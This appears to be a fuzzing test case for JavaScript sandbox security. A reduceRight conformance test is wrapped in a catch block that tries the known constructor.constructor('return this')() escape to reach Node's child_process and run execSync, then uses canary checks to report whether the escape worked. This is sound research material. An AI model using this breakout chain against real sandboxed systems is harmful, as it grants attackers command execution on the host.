try {
    var testResult1 = true;
    var testResult2 = false;
    function callbackfn(prevVal, curVal, idx, obj) {
        if (idx > 1) {
            testResult1 = false;
        }
        if (idx === 1) {
            testResult2 = true;
        }
        return false;
    }
    var valueOfAccessed = false;
    var obj = {
        0: 12,
        1: 11,
        2: 9,
        length: {
            valueOf: function () {
                valueOfAccessed = true;
                return 2;
            }
        }
    };
    Array.prototype.reduceRight.call(obj, callbackfn, 1);
    assert(testResult1, 'testResult1 !== true');
    assert(testResult2, 'testResult2 !== true');
    assert(valueOfAccessed, 'valueOfAccessed !== true');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}